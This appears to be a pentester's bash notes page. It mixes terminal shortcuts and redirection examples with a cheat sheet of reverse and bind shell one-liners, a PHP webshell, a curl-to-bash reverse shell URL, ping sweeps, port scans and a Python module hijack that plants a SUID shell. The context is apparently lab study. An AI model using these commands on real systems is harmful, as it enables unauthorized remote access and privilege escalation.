# 🤖 bash

Tags: #🤖
Related to: 
See also: 
Previous: [[PROGRAMMING]], [[Getting Started]]

## Description

## Usage Examples

### Cheatsheet

#### Auto-Complete

`[TAB]` - Initiates auto-complete. This will suggest to us different options based on the `STDIN` we provide. These can be specific suggestions like directories in our current working environment, commands starting with the same number of characters we already typed, or options.

#### Cursor Movement

`[CTRL] + A` - Move the cursor to the `beginning` of the current line.

`[CTRL] + E` - Move the cursor to the `end` of the current line.

`[CTRL] + [←]` / `[→]` - Jump at the beginning of the current/previous word.

`[ALT] + B` / `F` - Jump backward/forward one word.

#### Erase The Current Line

`[CTRL] + U` - Erase everything from the current position of the cursor to the `beginning` of the line.

`[Ctrl] + K` - Erase everything from the current position of the cursor to the `end` of the line.

`[Ctrl] + W` - Erase the word preceding the cursor position.

#### Paste Erased Contents

`[Ctrl] + Y` - Pastes the erased text or word.

#### Ends Task

`[CTRL] + C` - Ends the current task/process by sending the `SIGINT` signal. For example, this can be a scan that is running by a tool. If we are watching the scan, we can stop it / kill this process by using this shortcut. While not configured and developed by the tool we are using. The process will be killed without asking us for confirmation.

#### End-of-File (EOF)

`[CTRL] + D` - Close `STDIN` pipe that is also known as End-of-File (EOF) or End-of-Transmission.

#### Clear Terminal

`[CTRL] + L` - Clears the terminal. An alternative to this shortcut is the `clear` command you can type to clear our terminal.

#### Background a Process

`[CTRL] + Z` - Suspend the current process by sending the `SIGTSTP` signal.

#### Search Through Command History

`[CTRL] + R` - Search through command history for commands we typed previously that match our search patterns.

`[↑]` / `[↓]` - Go to the previous/next command in the command history.

#### Switch Between Applications

`[ALT] + [TAB]` - Switch between opened applications.

#### Zoom

`[CTRL] + [+]` - Zoom in.

`[CTRL] + [-]` - Zoom out.

### Using shells

| Command | Description |
|-|-|
| `nc -lvnp 1234` | Start a `nc` listener on a local port |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | Send a reverse shell from the remote server |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f \| /bin/sh -i 2>&1 \| nc 10.10.10.10 1234 >/tmp/f` | Another command to send a reverse shell from the remote server |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f \| /bin/bash -i 2>&1 \| nc -lvp 1234 >/tmp/f` | Start a bind shell on the remote server |
| `nc 10.10.10.1 1234` | Connect to a bind shell started on the remote server |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell TTY (1) |
| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice | Upgrade shell TTY (2) |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Create a webshell php file |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute a command on an uploaded webshell |

### Scan each IP address in a list using Shodan

	for i in $(cat ip-addresses.txt);do shodan host $i;done

### Add directory to PATH variable

##### Print the current PATH variable (Kali 2022.3)

	printenv | grep PATH

```shell-session
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
```

##### Add temporarily

Add `/home/<user>/.local/bin`

```shell-session
export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/<user>/.local/bin"
```

##### Add permanently

Append the path to the end of the config file:

	vim ~/.zshrc

```shell-session
export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/<user>/.local/bin"
```

### Get reverse shell

	http://10.129.171.59/templates/protostar/htb.php?pwn=curl 10.10.17.201/reverse_shell.sh | bash

### Ping sweep

	for i in {1..255};      do (ping -c 1 172.16.1.$i | grep "bytes from" | cut -d ' ' -f4 | tr -d ':' &); done
	for ip in $(seq 1 5);   do  ping -c 1 172.19.0.$ip > /dev/null && echo "Online: 172.19.0.$ip"; done

### Portscan

```sh
for port in 22 25 80 443 8080 8443; do
    (echo w00t > /dev/tcp/172.19.0.3/$port && echo "Open: $port") 2> /dev/null
done
```

```shell-session
Open: 80
```

### Harvest banners

```bash
for i in {0..255};
	do nc -nvw2 192.168.0.$i [port-range];
	done
```

### Reset terminal line settings

	reset

### Create alias

	alias ll='ls -alF'

### Create variables

	ports=$(nmap -p- --min-rate= 1000 -T4 10.10.10.150 | grep ^[ 0-9 ] | cut -d '/' -f  1  | tr  '\n'  ',' | sed s/,$//)
	
	nmap -sC -sV -p$ports 10.10.10.150 --open

### Preserve SUID on shell invocation

Python first checks for modules in the current working directory, before looking in the other paths. We can attempt to hijack loading of the legitimate call or urllib modules, so that our malicious module is loaded instead. Let's create a urllib.py file in the /home/frank folder with the contents below:

	vi urllib.py

```python
import os
os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")
```

	/tmp/sh -p	// #

### Transfer file

Transfer chisel to DANTE-WEB-NIX01:

	nc -lvnp 80 < chisel	// in my Dante/www
	bash -c "cat < /dev/tcp/10.10.16.52/80 > chisel"


### Redirect and Pipe

#### Redirect errors to STDERR

	find /etc/ -name shadow

```shell-session
find: ‘/etc/dovecot/private’: Permission denied
/etc/shadow
find: ‘/etc/ssl/private’: Permission denied
find: ‘/etc/polkit-1/localauthority’: Permission denied
```

	find /etc/ -name shadow 2>/dev/null

```shell-session
/etc/shadow
```

#### Redirect STDOUT to a file

	find /etc/ -name shadow 2>/dev/null > results.txt

#### Redirect STDOUT and STDERR to Separate Files

	find /etc/ -name shadow 2> stderr.txt 1> stdout.txt

#### Redirect STDIN

	cat < stdout.txt

#### Redirect STDOUT and Append to a File

	find /etc/ -name passwd >> stdout.txt 2>/dev/null

#### Redirect and pipe

	find /etc/ -name *.conf 2>/dev/null | grep systemd

```shell-session
/etc/systemd/system.conf
/etc/systemd/timesyncd.conf
/etc/systemd/journald.conf
/etc/systemd/user.conf
/etc/systemd/logind.conf
/etc/systemd/resolved.conf
```

	find /etc/ -name *.conf 2>/dev/null | grep systemd | wc -l

```shell-session
7
```

### Create customized bash prompt with greppable time

	cp .bashrc .bashrc.bak
	
	echo 'export PS1="-[\[$(tput sgr0)\]\[\033[38;5;10m\]\d\[$(tput sgr0)\]-\[$(tput sgr0)\]\[\033[38;5;10m\]\t\[$(tput sgr0)\]]-[\[$(tput sgr0)\]\[\033[38;5;214m\]\u\[$(tput sgr0)\]@\[$(tput sgr0)\]\[\033[38;5;196m\]\h\[$(tput sgr0)\]]-\n-[\[$(tput sgr0)\]\[\033[38;5;33m\]\w\[$(tput sgr0)\]]\\$ \[$(tput sgr0)\]"' >> .bashrc

```shell-session
-[Tue Mar 23-00:39:51]-[cry0l1t3@parrot]-
-[~]$ 
```

Another advantage of this is that we can filter out our commands by the `minus` (`-`) at the beginning later in our logs and thus see a list with only the date, time, and command specified.

### Automate script installation

The automation process is also an essential part of our preparation for penetration testing. Especially when it comes to internal penetration tests, where we have internet access and can adapt the workstation we are working on to our needs. This should be fast and efficient. For this, we have to create (in the best case) Bash scripts that automatically adjust our settings to the new system. Let us take the configuration and adjustment of our Bash prompt as an example. An example script can consist of the same commands we already configured.

#### Bash Prompt Customization Script - Prompt.sh

```bash
#### Make a backup of the .bashrc file
cp ~/.bashrc ~/.bashrc.bak

#### Customize bash prompt
echo 'export PS1="-[\[$(tput sgr0)\]\[\033[38;5;10m\]\d\[$(tput sgr0)\]-\[$(tput sgr0)\]\[\033[38;5;10m\]\t\[$(tput sgr0)\]]-[\[$(tput sgr0)\]\[\033[38;5;214m\]\u\[$(tput sgr0)\]@\[$(tput sgr0)\]\[\033[38;5;196m\]\h\[$(tput sgr0)\]]-\n-[\[$(tput sgr0)\]\[\033[38;5;33m\]\w\[$(tput sgr0)\]]\\$ \[$(tput sgr0)\]"' >> ~/.bashrc
```

If we then host this script on our VPS, we can retrieve it from our customer's Linux workstation and apply it.

#### Request Prompt.sh

	curl -s http://myvps.vps-provider.net/Prompt.sh | bash

#### Customized Bash Prompt

```shell-session
-[Wed Mar 24-11:27:15]-[user@workstation]-
-[~]$ 
```

A simple designation of these scripts is also of great use. For example, suppose we assume that we want to configure our Bash prompt and other operating system components. In that case, we need to name the scripts for this as `understandably` as possible. If we have created several scripts like this, we can write a simple Bash script from memory on the working station, which then does all the configuration. Let us assume we have created the following list of scripts, and we are hosting these on our `Virtual Private Server` (`VPS`):

#### Customization Scripts

	cat customization-scripts.txt

```shell-session
Prompt.sh
Tools.sh
GUI.sh
Tmux.sh
Vim.sh
```

Now we could write a Bash script that takes care of all these settings for us or even combines them into a single command:

#### Customization Scripts Execution

	for script in $(cat customization-scripts.txt); do curl -s http://myvps.vps-provider.net/$script | bash; done

With this command, each customization script is retrieved and executed one by one from our VPS. This allows us to make any changes to the workstation or our new VM quickly from memory.

### Execute a loop

	cat tools.list

```shell-session
netcat
ncat
nmap
wireshark
tcpdump
hashcat
ffuf
gobuster
hydra
zaproxy
proxychains
sqlmap
radare2
metasploit-framework
python2.7
python3
spiderfoot
theharvester
remmina
xfreerdp
rdesktop
crackmapexec
exiftool
curl
seclists
testssl.sh
git
vim
tmux
```

	sudo apt install $(cat tools.list | tr "\n" " ") -y

```shell-session
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following packages were automatically installed and are no longer required: 
  libarmadillo9 libboost-locale1.71.0 libcfitsio8 libdap25 libgdal27 libgfapi0
  ...SNIP...
```

# References

[^1]: https://explainshell.com/explain?cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.0.0.1%2F8080+0%3E%261

http://bashrcgenerator.com/  // generate a .bashrc